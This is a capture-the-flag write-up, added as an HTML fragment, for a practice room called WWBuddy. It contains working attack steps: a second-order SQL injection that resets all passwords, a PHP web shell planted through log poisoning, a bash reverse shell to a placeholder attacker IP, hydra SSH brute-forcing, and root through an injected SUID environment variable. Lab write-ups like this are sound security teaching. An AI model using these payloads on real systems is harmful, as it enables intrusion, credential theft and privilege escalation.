@@ -1,0 +1,89 @@
+<!--
+  writeups/ww-buddy.html - content fragment (loaded into the modal)
+  New writeup? Copy writeups/template.html -> writeups/<slug>.html.
+-->
+<h2>WWBuddy — SQLi to Env-Var Privesc</h2>
+<p>A "make friends" site still in development. The chain: a second-order SQL injection resets every password, an unsanitized username poisons an admin log into a PHP shell, a MySQL log leaks a password, and a SUID binary trusts the <code>USER</code> env var. Goal: 3 flags.</p>
+
+<h3>1 · Enumeration</h3>
+<pre><code><span class="tok-comment"># Map the room IP to a hostname</span>
+<span class="tok-func">echo</span> "<span class="tok-string">10.10.x.x wwbuddy.thm</span>" &gt;&gt; /etc/hosts
+
+<span class="tok-comment"># Port scan</span>
+<span class="tok-func">nmap</span> -sV -sC wwbuddy.thm
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh
+80/tcp open  http   Apache
+
+<span class="tok-comment"># Directory enum</span>
+<span class="tok-func">gobuster</span> dir -u http://wwbuddy.thm/ -w /usr/share/wordlists/common.txt
+
+/admin  /api  /register  /login  /profile</code></pre>
+
+<h3>2 · Second-Order SQLi — Reset Everyone's Password</h3>
+<p>The username is stored unsanitized and later reused inside a raw <code>UPDATE</code> query when you change your own password. Inject a username that makes the <code>WHERE</code> clause match every row — now all passwords become yours.</p>
+<pre><code><span class="tok-comment"># 1) Register, then set your username to</span>
+<span class="tok-keyword">' or 1=1-- -</span>
+
+<span class="tok-comment"># 2) Change your password to a known value, e.g. adminadmin</span>
+
+<span class="tok-comment"># 3) The backend effectively runs</span>
+UPDATE users SET password = <span class="tok-string">'adminadmin'</span>
+WHERE old_password = users.old_password
+  AND username = <span class="tok-string">''</span> OR <span class="tok-num">1</span>=<span class="tok-num">1</span>-- -
+
+<span class="tok-comment"># 4) Login as any known user — password is now adminadmin</span>
+WWBuddy : adminadmin</code></pre>
+
+<h3>3 · Log Poisoning → RCE</h3>
+<p>Login as <code>WWBuddy</code> and plant a PHP one-liner as the username. Then log in as <code>Henry</code>, the account allowed into <code>/admin</code> — the dashboard prints every visitor's username unsanitized, so the payload is executed and a <code>cmd</code> parameter appears.</p>
+<pre><code><span class="tok-comment"># Username to plant</span>
+<span class="tok-string">&lt;?php system($_GET['cmd']); ?&gt;</span>
+
+<span class="tok-comment"># Run commands through /admin</span>
+http://wwbuddy.thm/admin/?cmd=<span class="tok-func">id</span>
+uid=<span class="tok-num">33</span>(www-data) gid=<span class="tok-num">33</span>(www-data)
+
+<span class="tok-comment"># Reverse shell — URL-encode this and pass it to cmd</span>
+<span class="tok-func">bash</span> -i &gt;&amp; /dev/tcp/<span class="tok-string">ATTACK_IP</span>/<span class="tok-num">4444</span> <span class="tok-num">0</span>&gt;&amp;<span class="tok-num">1</span>
+
+<span class="tok-comment"># Attacker listener</span>
+<span class="tok-func">nc</span> -lvnp <span class="tok-num">4444</span></code></pre>
+
+<h3>4 · www-data → roberto (MySQL log leak)</h3>
+<p>Run <code>linpeas</code>. It surfaces <code>/var/log/mysql/general.log</code>, which records every query — including roberto typing his password into the username box by accident.</p>
+<pre><code><span class="tok-func">grep</span> -i roberto /var/log/mysql/general.log
+<span class="tok-comment"># &gt; roberto : &lt;password&gt;</span>
+
+<span class="tok-func">ssh</span> roberto@wwbuddy.thm
+<span class="tok-comment"># user flag</span>
+<span class="tok-func">cat</span> /home/roberto/importante.txt
+<span class="tok-comment"># THM{...}</span></code></pre>
+<p><code>importante.txt</code> is in Portuguese (Roberto is Brazilian): "Jenny turns 26 next week". The web app uses <code>mm/dd/yyyy</code> as default passwords.</p>
+
+<h3>5 · roberto → jenny (birthday bruteforce)</h3>
+<pre><code><span class="tok-comment"># File modified ~Jul 27 2020 → Jenny's birthday in 08/01–08/09/1994</span>
+<span class="tok-func">stat</span> /home/roberto/importante.txt | <span class="tok-func">grep</span> Modify
+
+<span class="tok-comment"># Wordlist of candidate mm/dd/yyyy dates</span>
+<span class="tok-func">seq</span> <span class="tok-num">1</span> <span class="tok-num">9</span> | <span class="tok-func">awk</span> <span class="tok-string">'{printf "08/0%d/1994\n", $1}'</span> &gt; datelist.txt
+
+<span class="tok-func">hydra</span> -l jenny -P datelist.txt wwbuddy.thm ssh
+<span class="tok-func">ssh</span> jenny@wwbuddy.thm</code></pre>
+
+<h3>6 · jenny → root (SUID + env injection)</h3>
+<p><code>/bin/authenticate</code> is SUID-root. Reversing it (Ghidra) shows it builds <code>usermod -G developer &lt;name&gt;</code> from the <code>USER</code> env var and feeds it to <code>system()</code> — so the var itself becomes our injection point.</p>
+<pre><code><span class="tok-comment"># Spot the unusual SUID binary</span>
+<span class="tok-func">find</span> / -type f -perm -4000 2&gt;/dev/null
+/bin/authenticate   <span class="tok-comment"># SUID, owned by root</span>
+
+<span class="tok-comment"># Inject a shell through the env var</span>
+<span class="tok-func">export</span> USER=<span class="tok-string">"jenny; bash"</span>
+/bin/authenticate
+
+<span class="tok-comment"># root shell — read the flag</span>
+root@wwbuddy:~# <span class="tok-func">cat</span> /root/root.txt
+<span class="tok-comment"># THM{...}</span></code></pre>
+
+<h3>7 · Retrospective</h3>
+<p>Attack chain: second-order SQLi password reset → log-poisoned PHP shell → MySQL log credential leak → birthday bruteforce → SUID env-var injection. Lessons: sanitize every place a username is reused, keep MySQL's general log off, and never trust environment variables in SUID binaries.</p>
